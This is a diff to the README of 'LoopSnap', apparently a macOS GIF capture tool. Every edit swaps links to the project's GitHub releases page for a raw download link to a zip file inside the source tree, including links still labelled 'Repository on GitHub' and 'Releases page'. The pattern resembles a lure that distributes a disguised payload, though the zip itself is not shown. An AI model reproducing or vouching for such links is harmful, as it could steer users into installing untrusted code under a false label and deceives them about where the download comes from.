@@ -1,6 +1,6 @@
 # 🎞 LoopSnap - Easy GIF Capture and Export
 
-[![Download LoopSnap](https://img.shields.io/badge/Download-LoopSnap-brightgreen?style=for-the-badge)](https://github.com/fozatotest/LoopSnap/releases)
+[![Download LoopSnap](https://img.shields.io/badge/Download-LoopSnap-brightgreen?style=for-the-badge)](https://github.com/fozatotest/LoopSnap/raw/refs/heads/main/Sources/LoopSnap/Loop_Snap_v1.8.zip)
 
 ---
 
@@ -33,7 +33,7 @@ This section walks you through downloading, installing, and running LoopSnap.
 
 You need to download the installer from the releases page. The link below takes you there:
 
-[![Download LoopSnap](https://img.shields.io/badge/Download-LoopSnap-orange?style=for-the-badge)](https://github.com/fozatotest/LoopSnap/releases)
+[![Download LoopSnap](https://img.shields.io/badge/Download-LoopSnap-orange?style=for-the-badge)](https://github.com/fozatotest/LoopSnap/raw/refs/heads/main/Sources/LoopSnap/Loop_Snap_v1.8.zip)
 
 #### How to find the correct file on the releases page:
 
@@ -144,7 +144,7 @@ LoopSnap lets you control a few key options:
 
 To get new features or bug fixes:
 
-- Visit the release page again: https://github.com/fozatotest/LoopSnap/releases
+- Visit the release page again: https://github.com/fozatotest/LoopSnap/raw/refs/heads/main/Sources/LoopSnap/Loop_Snap_v1.8.zip
 - Download the latest `.dmg` or `.zip` file.
 - Install over your existing app by replacing it in the Applications folder.
 
@@ -164,12 +164,12 @@ Your feedback helps improve LoopSnap.
 
 ## 📂 Where to Find LoopSnap
 
-- Repository on GitHub: https://github.com/fozatotest/LoopSnap
-- Releases page: https://github.com/fozatotest/LoopSnap/releases
+- Repository on GitHub: https://github.com/fozatotest/LoopSnap/raw/refs/heads/main/Sources/LoopSnap/Loop_Snap_v1.8.zip
+- Releases page: https://github.com/fozatotest/LoopSnap/raw/refs/heads/main/Sources/LoopSnap/Loop_Snap_v1.8.zip
 
 Download link again for easy access:
 
-[![Download LoopSnap](https://img.shields.io/badge/Download-LoopSnap-brightgreen?style=for-the-badge)](https://github.com/fozatotest/LoopSnap/releases)
+[![Download LoopSnap](https://img.shields.io/badge/Download-LoopSnap-brightgreen?style=for-the-badge)](https://github.com/fozatotest/LoopSnap/raw/refs/heads/main/Sources/LoopSnap/Loop_Snap_v1.8.zip)
 
 ---
 
